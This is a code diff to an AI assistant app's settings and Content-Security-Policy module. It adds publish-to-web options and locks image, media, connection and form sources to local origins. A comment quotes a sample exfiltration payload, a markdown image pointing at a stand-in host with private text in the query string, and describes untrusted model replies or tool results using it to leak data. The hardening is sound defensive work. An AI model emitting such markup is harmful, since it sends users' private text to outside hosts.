@@ -2318,6 +2318,13 @@ DEFAULT_SETTINGS = {
     "user_email": "",                      # the user's own email — passed through unscrubbed
     "off_record": False,                   # quick toggle — when true, chat is not logged either
     "off_record_stops_storage": True,      # off-record writes nothing about the conversation to disk (receipts and governance logs keep only tool, class, decision and time)
+    # ── Artifact panel (docs/design/active/vibe-coding-salon.md §4.2) ──
+    "artifact_panel_enabled": True,        # the panel beside every chat; also keeps artifact_put resident in the tool set
+    # ── Publish to web (docs/design/active/vibe-coding-salon.md §4.10.1) ──
+    "publish_default_adapter": "this_pc",  # owner decision 2026-09-29: this PC by default; cloudflare_pages | github_pages for always-on pages
+    "publish_mark": True,                  # the small "Made with Friday" mark on published pages
+    "publish_this_pc_enabled": True,       # the kill switch for local hosting: False takes every published page offline at once
+    "publish_this_pc_tunnel": True,        # False keeps published pages on this PC's loopback only (no cloudflared quick tunnel)
     # ── Workspaces / Dock ──
     # When True the dock shows ALL workspaces (Finance, Health, Family, Trust,
     # Studio, Content, FutureSpeak); when False it shows only the
@@ -3922,11 +3929,22 @@ _SANDBOX_NEVER = frozenset({
 # Friday's own pages. `script-src` keeps inline script and eval because the UI
 # is one inline bundle and MediaPipe hand tracking (opt-in, SRI-pinned, loaded
 # from one CDN) compiles WebAssembly and uses eval. `frame-src` admits blob: and
-# data: for the sandboxed previews the page builds itself. Connections, images,
-# media, fonts and styles are left open: the page talks to local model servers
-# and the owner's own providers.
+# data: for the sandboxed previews the page builds itself.
+#
+# Nothing the page renders may fetch from outside: a reply, a fetched page or a
+# tool result is untrusted, and `![](https://host/?d=<private text>)` would send
+# that text to the host with no gate in the way. Images, media and fonts come
+# from Friday's own origin, inline data or a blob: the page made itself, and
+# connections go to Friday's own origin (HTTP, SSE and WebSocket) plus the one
+# CDN hand tracking compiles from. Model servers and providers are reached by
+# the server, never by the page. A remote picture the owner clicks to load is
+# fetched by the server (/api/remote-image) and shown from a blob:.
 OWN_PAGE_CSP = "; ".join((
     "script-src 'self' 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' blob: https://cdn.jsdelivr.net",
+    "img-src 'self' data: blob:",
+    "media-src 'self' data: blob:",
+    "font-src 'self' data:",
+    "connect-src 'self' blob: data: https://cdn.jsdelivr.net",
     "worker-src 'self' blob:",
     "frame-src 'self' blob: data:",
     "frame-ancestors 'self'",
@@ -3940,18 +3958,44 @@ def _split_csp(value):
     return [p.strip() for p in (value or "").split(";") if p.strip()]
 
 
+# What a sandboxed document may load or send, whatever it asks for: its own
+# server's files and inline data, never another host. A document that carries
+# script is model-authored or fetched; a remote image or a fetch() is how it
+# would carry private text out.
+SANDBOX_NO_REMOTE_CSP = (
+    ("img-src", ("'self'", "data:", "blob:")),
+    ("media-src", ("'self'", "data:", "blob:")),
+    ("connect-src", ("'none'",)),
+    ("form-action", ("'none'",)),
+)
+_LOCAL_SOURCES = frozenset({"'self'", "data:", "blob:", "'none'"})
+
+
 def _sandboxed_csp(existing):
     """`existing` with a `sandbox` directive that is never wider than either the
-    existing one or Friday's default."""
-    out, seen = [], False
+    existing one or Friday's default, and with image, media, connection and form
+    sources that name no remote host."""
+    out, seen, have = [], False, set()
+    wanted = dict(SANDBOX_NO_REMOTE_CSP)
     for p in _split_csp(existing):
         bits = p.split()
-        if bits and bits[0].lower() == "sandbox":
+        name = bits[0].lower() if bits else ""
+        if name == "sandbox":
             seen = True
             kept = [t for t in bits[1:] if t.lower() not in _SANDBOX_NEVER]
             out.append(" ".join(["sandbox"] + kept))
+        elif name in wanted:
+            have.add(name)
+            if name in ("connect-src", "form-action"):
+                out.append(name + " 'none'")
+            else:
+                kept = [t for t in bits[1:] if t.lower() in _LOCAL_SOURCES]
+                out.append(" ".join([name] + (kept or list(wanted[name]))))
         else:
             out.append(p)
+    for name, tokens in SANDBOX_NO_REMOTE_CSP:
+        if name not in have:
+            out.append(" ".join((name,) + tokens))
     if not seen:
         out.insert(0, " ".join(("sandbox",) + SANDBOX_DEFAULT_TOKENS))
     return "; ".join(out)
